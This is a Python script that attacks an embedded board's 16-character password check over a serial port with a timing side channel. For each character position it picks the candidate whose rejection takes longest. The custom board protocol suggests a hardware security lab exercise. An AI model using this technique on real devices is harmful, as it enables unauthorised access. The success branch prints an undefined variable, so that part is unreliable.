#!/usr/bin/env python3

import serial
import time
import sys
import re
import pdb
import string
import os
import traceback
import itertools
from enum import Enum
import numpy as np

np.set_printoptions(linewidth=100, precision=4)

# Open the serial port
ser = serial.Serial('/dev/ttyUSB1', baudrate=115200)


class Command(Enum):
    SET_PWD = 's'
    GET_PWD = 'g'
    SEND_PWD = 'p'
    RESET = chr(27)


def pwd_failed() -> bool:
    m = b"Password Incorrect.\r\n\x00"
    tty_resp = ser.read(len(m))

    if m == tty_resp:
        return True
    return False


def send_reset():
    # print("Resetting board.")
    ser.write(chr(27).encode("ascii"))


def reset():
    send_reset()

    m = b"Please enter the Password:\r\n\x00"
    tty_resp = ser.read(len(m))

    if m != tty_resp:
        raise Exception(f"Failed to reset board, res: '{tty_resp}'")


def send_command(cmd: Command, pwd: str = None):
    s = cmd.value.encode("ascii")
    # print(f"Sending {s}")
    num = ser.write(s)
    if num != 1:
        raise Exception("Failed sending full password")

    if cmd == Command.SEND_PWD and pwd != None:
        raise Exception("Send pwd should not have a password as argument")

    if pwd and cmd == Command.SET_PWD:
        s = pwd.encode("ascii")
        # print(f"Sending {s}")
        num = ser.write(s)
        if num != 16:
            raise Exception("Failed sending full password")

    if cmd == Command.GET_PWD:
        res = ser.read(16)
        return res.decode("ascii")

    return None



def normalize_array(arr):
    arr = np.array(arr)
    normalized_arr = arr / np.linalg.norm(arr, ord=1)
    return normalized_arr

# ============== Main ==============
from string import digits, ascii_letters, punctuation

# Init global variables
CHARS = digits + ascii_letters + punctuation
PWD_ARR = [CHARS[0] for i in range(16)]

# Initialize arrays
arr_diff = np.zeros((16, len(CHARS)), dtype=np.int32)
norm_array = np.zeros((16, len(CHARS)), dtype=np.float32)
prev_i = 0


reset()
pwd_temp = send_command(Command.GET_PWD)
if pwd_temp != "ABCDEFGHIJKLMNOP":
    print(f"Password is not default. Is '{pwd_temp}'")


try:
    try:
        for pwd_i in range(16):
            for (c_i, c) in enumerate(CHARS):
                PWD_ARR[pwd_i] = c

                # If we jumped to next password index
                if prev_i != pwd_i:
                    # Calculate variance
                    norm_array[prev_i] = normalize_array(arr_diff[prev_i])
                    variance = np.var(norm_array[prev_i])
                    #if variance > 8e-7:
                    #    print(f"Variance too high: {variance}")
                    #    raise KeyboardInterrupt("Variance too high")

                    # Find character with highest time
                    max_index = np.argmax(arr_diff[prev_i])
                    sol_char = CHARS[max_index]
                    # Set previous index character to character with highest time
                    PWD_ARR[prev_i] = sol_char

                    #if pwd_i == 3:
                    #    raise KeyboardInterrupt()

                pwd_str = "".join(PWD_ARR)
                print(f"Cracking password: {pwd_str} pwd_i: {pwd_i} c_i: {c_i}")
                send_command(Command.SET_PWD, pwd_str)

                start = time.perf_counter_ns()
                send_command(Command.SEND_PWD)

                if pwd_failed():
                    end = time.perf_counter_ns()
                    diff = end - start
                    arr_diff[pwd_i][c_i] = diff
                    reset()
                    os.system('clear')
                else:
                    print(f"====== Password is '{pwd}' ==========")
                    break
                prev_i = pwd_i
    except KeyboardInterrupt:
        print("Exiting")


    for i in range(prev_i +1):
        print("="*10 +  f"[{i}]" + "="*10)
        print(f"{arr_diff[i]}")
        print(f"[{i}]: Variance: {np.var(arr_diff[i])}")
        print(f"[{i}]: Normalized Variance: {np.var(norm_array[i])}")


    # Close the serial port
    ser.close()
except Exception as ex:
    extype, value, tb = sys.exc_info()
    traceback.print_exc()
    pdb.post_mortem(tb) 
